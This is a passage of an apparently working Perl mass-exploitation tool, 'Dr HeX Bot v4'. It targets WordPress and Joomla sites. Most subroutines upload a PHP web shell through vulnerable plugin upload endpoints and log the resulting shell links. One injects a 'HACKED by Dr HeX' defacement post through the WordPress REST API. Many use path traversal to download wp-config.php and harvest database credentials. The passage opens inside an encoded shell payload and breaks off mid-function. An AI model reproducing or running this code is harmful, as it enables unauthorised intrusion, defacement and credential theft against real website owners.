sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>';
my $body = $ua->post( $izo,
        Content_Type => 'multipart/form-data',
        Content => $index
        );
		print color('bold red'),"waiting+++\n";
		}
my $checkfoxupx = $ua->get("$site/components/com_b2jcontact/uploads/izoc.php")->content;
if ($checkfoxupx =~ /Uploder hex/) {	
print color('bold red'),"Shell Uploaded Successfully\n";
print color('bold Yellow'),"[ShellLink] => $site/components/com_b2jcontact/uploads/izoc.php\n";
		    print color('reset');
open (TEXT, '>>Zombi_v4/shell.txt');
print TEXT "$site/components/com_b2jcontact/uploads/izoc.php\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"B2j Contact";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold red'),"False\n";			
}
}
}
}
}
#############################################
sub developertools(){ 
my $url = "$site/wp-content/plugins/developer-tools/libs/swfupload/upload.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'UPLOADDIR'=>'../', 'ADMINEMAIL'=>'test@example.com', 'Filedata' => ["v4.php"]]);

$zoomerup="$site//wp-content/plugins/developer-tools/libs/v4.php?";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"developer-tools";
print color('bold white')," +++++++++++++++++++ ";
print color('bold Yellow'),"VULN";
print color('bold white'),"\n";
print color('bold Yellow')," [";
print color('bold red'),"+";
print color('bold Yellow'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Zombi_v4/Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"developer-tools";
print color('bold white')," +++++++++++++++++++ ";
print color('bold red'),"False";
print color('bold white'),"\n";
}
}
#############################################
sub genesissimple(){ 
my $url = "$site/wp-content/plugins/genesis-simple-defaults/uploadFavicon.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'upload-favicon'=>'fake', 'iconImage' => ["v4.php"]]);

$zoomerup="$site//wp-content/uploads/favicon/v4.php";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"genesis-simple";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold Yellow'),"VULN";
print color('bold white'),"\n";
print color('bold Yellow')," [";
print color('bold red'),"+";
print color('bold Yellow'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Zombi_v4/Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"genesis-simple";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold red'),"False";
print color('bold white'),"\n";
}
}

################ joom plugin #####################
sub simpleplugin(){ 
my $url = "$site/administrator/components/com_simplephotogallery/lib/uploadFile.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => ['uploadfile' => ["v4.php"], "jpath" => "..%2F..%2F..%2F..%2F" ]);

if ($response->content =~ /v4(.*?)php/) {
$uploadfolder=$1.'php?';
}
$zoomerup="$site/v4'.$uploadfolder.'";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"com_simplephotogallery";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"Done";
print color('bold white'),"\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $zoomerup\n";
open (TEXT, '>>Zombi_v4/Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"com_simplephotogallery";
print color('bold white')," =====HeX=====> ";
print color('red'),"False";
print color('bold white'),"\n";
}
}
################ comsexycontactform 2 #####################
sub sexycontactform2(){
my $url = "$site/com_sexycontactform/fileupload/index.php";
my $shell ="v4.php";
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );

$sexyup="$site/com_sexycontactform/fileupload/files/v4.php";

$checkpofxwup = $ua->get("$sexyup")->content;
if($checkpofxwup =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com sexycontactform2";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"   File Uploaded Successfully\n";
print color('bold white'),"   [Get] => $sexyup\n";
open (TEXT, '>>Zombi_v4/shell.txt');
print TEXT "$sexyup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com sexycontactform2";
print color('bold white')," =====HeX=====> ";
print color('red'),"False\n";
}
}
################ Creative Contact Form #####################
sub sexycontactform(){ 
my $url = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php";
$sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/v4.php";
my $field_name = "files[]";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["v4.php"] ]
           
            );

$checksexycontactup = $ua->get("$sexycontactup")->content;
if($checksexycontactup =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Creative Contact Form";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $sexycontactup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$sexycontactup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Creative Contact Form";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}

################ Work The Flow File Upload #####################
sub wtffu(){
my $url = "$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/";
my $shell ="v4.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/v4.php";

$checkwtffup = $ua->get("$wtffup")->content;
if($checkwtffup =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Work The Flow File Upload";
print color('bold white')," +++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $wtffup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$wtffup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Work The Flow File Upload";
print color('bold white')," +++++++++ ";
print color('bold red'),"False\n";
}
}

################ WP Job Manger #####################
sub wpjm(){
my $url = "$site/jm-ajax/upload_file/";
my $image ="v4.php";
my $field_name = "file[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$image"] ]
           
            );

$jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/$year/$month/v4hex.gif";
$checkpofwup = $ua->get("$jobmangerup")->content_type;
if($checkpofwup =~/image\/gif/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"WP Job Manger";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Get] => $jobmangerup\n";
open (TEXT, '>>Zombi_v4/v4index.txt');
print TEXT "$jobmangerup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"WP Job Manger";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}

################  PHP Event Calendar #####################
sub phpeventcalendar(){
my $url = "$site/wp-content/plugins/php-event-calendar/server/file-uploader/";
my $shell ="v4.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/v4.php";

if ($response->content =~ /{"files/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"PHP Event Calendar";
print color('bold white')," ++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $phpevup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$phpevup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"PHP Event Calendar";
print color('bold white')," ++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ Synoptic #####################
sub synoptic(){
my $url = "$site/wp-content/themes/synoptic/lib/avatarupload/upload.php";
my $shell ="v4.php";
my $field_name = "qqfile";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$Synopticup="$site/wp-content/uploads/markets/avatars/v4.php";

$checkSynopticup = $ua->get("$Synopticup")->content;
if($checkSynopticup =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Synoptic";
print color('bold white')," ++++++++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $Synopticup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$Synopticup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Synoptic";
print color('bold white')," ++++++++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ Wpshop #####################
sub Wpshop(){
my $url = "$site/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload";
my $shell ="v4.php";
my $field_name = "wpshop_file";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wpshopup="$site/wp-content/uploads/v4.php";

$checkwpshopup = $ua->get("$wpshopup")->content;
if($checkwpshopup =~/Dr HeX Shell/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Wp Shop";
print color('bold white')," +++++++++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $wpshopup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$wpshopup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Wp Shop";
print color('bold white')," +++++++++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

############### wpinjetc  ####################

sub wpinjetc($site){
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Wordpress Inject+++++++++++++++++++ ";

$linkposts = $site . 'index.php/wp-json/wp/v2/posts/';



$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (30);


$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;
$ajx = $site . '/wp-json/wp/v2/posts/'.$id;



	
$defx="														<h2><center>Dr HeX <center></h2>
						</div>
						<div class=\"post_content\">
							<p><title>HACKED by Dr HeX
</title></p>
<div style=\"text-align: center\"><font size=\"6\" face=\"comic sans ms\"><b>Hacked By Dr HeX Bot v4</b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><font color=red>HACKED</font> Dr HeX <font color=red>HACKED</font> Dr HeX <font color=red>HACKED</font> Dr HeX <font color=red>HACKED</font> Dr HeX <font color=red>HACKED</font> Dr HeX <br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b>thank you gassrini for the tool  <br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b></p>
<p>
						</div>";
$file="hex.html";
$sirina=$id . 'justracccwdata';
$def=  $site . 'hex.html';
$gassface = POST $ajx, ['id' => $sirina, 'title' => 'HACKED By Dr HeX', 'slug'=> $file,'content' => $defx];
$response = $ua->request($gassface);
$stat = $response->content;
	if ($stat =~ /Dr HeX/){
   print color('bold Yellow');
print "[Succes]\n";
    print color('reset');
				    open(save, '>>Result_v4/v4index.txt');  
    print save "$def\n";  
    close(save);
zoneh();

	}
else{
   print color('bold red');
print "False\n";
    print color('reset');}
}
else{
   print color('bold red');
print "False\n";
    print color('reset');}
}

####################################################################################################

sub acento(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Acento ++++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################

	
	
	
sub ajaxstore(){              print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
print color('bold white'),"ajax-store-locator-wordpress_0 ++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
sub Antioch(){              print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
print color('bold white'),"Antioch +++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
	sub Authentic(){              print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
print color('bold white'),"Authentic +++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
	sub Churchope(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
print color('bold white'),"Churchope +++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
	
	
	sub Epic(){            print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Epic ++++++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/epic/includes/download.php?file=wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	
	
	
	
	
	
	
sub Felis(){              print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
print color('bold white'),"Felis +++++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/felis/download.php?file=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
####################################################################################################
	

	
	
	
	
	
	
	sub Force(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
print color('bold white'),"Force-Download ++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/force-download.php?file=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
####################################################################################################
	
	
	
	
	

	
	
sub FR0(){              print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
print color('bold white'),"FR0_theme +++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/FR0_theme/down.php?path=$site/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print " VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False ";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
sub hbaudio(){            print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"hb-audio-gallery-lite +++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	sub History(){            print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"History-collection ++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	sub Imageex(){            print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Image-export ++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/image-export/download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	####################################################################################################

	
	
	
	
	
	sub kbslider(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"kbslider_show_image +++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
	####################################################################################################

	
	
	sub Linenity(){              print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
print color('bold white'),"Linenity ++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	sub Lote27(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Lote27 ++++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/lote27/download.php?download=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	
	
	
sub Markant(){              print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
print color('bold white'),"Markant +++++++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/markant/download.php?file=../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	sub MichaelCanthony(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
print color('bold white'),"MichaelCanthony +++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	sub mTheme(){            print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"mTheme-Unus +++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	sub NativeChurch(){            print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"NativeChurch ++++++++++++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold Yellow');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Zombi_v4/Jom-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "False";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	sub Parallelus(){             print color('bold white'),"[";print color('bold Yellow'),"+";print color('bold white'),"] ";
 print color('bold white'),"Parallelus-Salutation +++++++++++++ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
